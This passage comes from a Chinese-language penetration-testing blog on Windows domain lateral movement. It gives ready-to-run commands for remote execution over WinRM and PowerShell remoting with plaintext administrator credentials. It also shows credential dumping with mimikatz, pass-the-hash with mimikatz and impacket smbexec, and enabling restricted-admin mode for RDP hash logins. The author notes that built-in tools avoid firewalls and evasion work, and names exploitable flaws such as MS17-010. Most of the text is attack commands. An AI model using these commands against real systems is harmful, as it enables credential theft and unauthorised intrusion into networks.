<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">#也可以运行cmd</span><br>winrs -r:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.137</span>:<span class="hljs-number">5985</span> -u:administrator -p:admin <span class="hljs-string">&quot;cmd&quot;</span><br></code></pre></td></tr></table></figure>

<p>微软官方给出的建议</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>learn.microsoft.com<span class="hljs-regexp">/zh-cn/</span>troubleshoot<span class="hljs-regexp">/windows-client/</span>system-management-components/errors-when-you-run-winrm-commands<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207231306921.png"  ><span class="image-caption">image-20230207231306921</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208190054019.png"  ><span class="image-caption">image-20230208190054019</span></p>
<h3 id="winrm-cmd"><a href="#winrm-cmd" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>winrm.cmd运行WMI对象通过WinRM传输进行远程交互，在本地或者远程计算机上枚举WMI对象实例或调用WMI类方法</p>
<p>调用WMI的win32_process类中的create方法来创建进程</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>Create wmicimv2/Win32_Process @&#123;CommandLine=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125; -r:http://192.168.8.1:5985 -u:administrator -p:ADMIN!@<span class="hljs-comment">#45</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191821182.png"  ><span class="image-caption">image-20230208191821182</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208191918882.png"  ><span class="image-caption">image-20230208191918882</span></p>
<h2 id="WinRM获取交互式会话"><a href="#WinRM获取交互式会话" class="headerlink" title="WinRM获取交互式会话"></a>WinRM获取交互式会话</h2><p>powershell的远程传输协议是基于WinRM的</p>
<p>Enter-PSSession的PowerShell Cmdlet可以启动和远程主机的会话</p>
<p>创建会话</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程用户名</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;administrator&quot;</span><br><br><span class="hljs-comment">#用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#创建会话</span><br><span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><span class="hljs-comment">#-Name是创建会话的命名</span><br><span class="hljs-comment">#-ComputerName是目标主机，可以是ip，也可以是主机名字</span><br><span class="hljs-comment">#-Credential是整合的凭据</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194112653.png"  ><span class="image-caption">image-20230208194112653</span></p>
<p>查看存在的所有会话</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-PSSession</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194357863.png"  ><span class="image-caption">image-20230208194357863</span></p>
<p>选择会话</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">Enter</span>-PSSession -Name <span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208194459781.png"  ><span class="image-caption">image-20230208194459781</span></p>
<p>这样就成功了</p>
<p>也可以使用Invoke-Command</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;ADMIN!@#45&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-variable">$Sess</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-Name</span> Test1 <span class="hljs-literal">-ComputerName</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">5985</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Session</span> <span class="hljs-variable">$Sess</span> <span class="hljs-literal">-ScriptBlock</span> &#123;whoami&#125;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208195219772.png"  ><span class="image-caption">image-20230208195219772</span></p>
<p>成功</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用WinRM进行横向移动，最出色的地方在于，服务是windows自己提供的，开启服务就不会被防火墙拦截</p>
<p>其次是所利用的工具组件，都是Windows自带的，不用做免杀，除非EDR拦截了winrs.exe</p>
<h1 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h1><p>在windows server 2000之后，在windows中密码都用hash值保存，想要获取明文密码是比较困难的</p>
<p>获取到hash值密码之后，想要得到明文，是比较困难的，因为hash算法是一个单向的算法，不可逆</p>
<p>但是</p>
<p>hash值也是可以暴力破解的</p>
<h2 id="哈希传递攻击的利用"><a href="#哈希传递攻击的利用" class="headerlink" title="哈希传递攻击的利用"></a>哈希传递攻击的利用</h2><p>主要是mimikatz和impacket工具包里面的工具</p>
<p>其次就是crackmapexec、powershell、evil-winrm、metasploit框架工具等等</p>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>需要具备本地管理员权限</p>
<p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gentilkiwi/mimi</span>katz<br></code></pre></td></tr></table></figure>

<p>首先需要将mimikatz上传到目标主机</p>
<p>然后执行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>得到本地主机的管理员账户hash值</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208211118148.png"  ><span class="image-caption">image-20230208211118148</span></p>
<p>再进行尝试进行传递，可能其他主机也是这个密码</p>
<p><strong>就是碰运气去试账号密码</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>







<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>常用的几个是psexec.py、smbexec.py、wmiexec.py</p>
<p>当然如果跳板机有python环境就不错，如果没有，可以把python文件打包为exe文件，也是可以执行的</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">#打包<span class="hljs-keyword">python</span>文件为<span class="hljs-keyword">exe</span><br><br>pip install pyinstaller<br><br><span class="hljs-keyword">cd</span> impacket\examples<br><br>pyinstaller -F wmiexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>



<p>也可以通过内网代理技术，代理到kali</p>
<p>以smbexec.py为例，其他两个的用法大同小异</p>
<h4 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h4><p>打包为exe文件</p>
<p>exe文件地址</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">impacket-<span class="hljs-literal">master</span>\examples\dist<br></code></pre></td></tr></table></figure>



<p>使用</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">smbexec</span>.exe -hashes :<span class="hljs-number">5</span>b56663cfe976a8b6a841ff7c1abcee1 sayms/administrator@<span class="hljs-number">192.168.8.1</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230208214117812.png"  ><span class="image-caption">image-20230208214117812</span></p>
<p><strong><font color='red'>就算开启防火墙，也是可以进行使用的</font></strong></p>
<h2 id="哈希传递登陆远程桌面"><a href="#哈希传递登陆远程桌面" class="headerlink" title="哈希传递登陆远程桌面"></a>哈希传递登陆远程桌面</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>远程主机开启了“受限管理员模式”</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">windows</span> server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>及其以上版本支持受限管理员模式<br>开启此模式，可以使用hash值进行远程登录，不需要明文密码<br><br>此模式在win8.<span class="hljs-number">1</span>和windows server <span class="hljs-number">2012</span><span class="hljs-built_in">r2</span>中默认开启<br></code></pre></td></tr></table></figure>



<p>使用的用户凭据处于管理员组</p>
<p>hash值</p>
<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><p>开启受限管理员模式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询是否开启，结果为0，表示启动</span><br>reg query <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin<br><br><span class="hljs-comment">#开启命令</span><br>reg add <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure>



<p>开启之后，使用mimikatz进行hash传递，然后执行“mstsc.exe /restrictedadmin”</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:administrator /domain:sayms /ntlm:5b56663cfe976a8b6a841ff7c1abcee1&quot;</span> <span class="hljs-string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></code></pre></td></tr></table></figure>









<h1 id="远程执行漏洞"><a href="#远程执行漏洞" class="headerlink" title="远程执行漏洞"></a>远程执行漏洞</h1><p>一些远程执行漏洞，也可以用来横向</p>
<p>比如</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">永恒之蓝 ms17<span class="hljs-string">-010</span><br><br>cve<span class="hljs-string">-2019</span><span class="hljs-string">-0708</span><br><br>ms08<span class="hljs-string">-067</span><br></code></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域横向</tag>
      </tags>
  </entry>
</search>
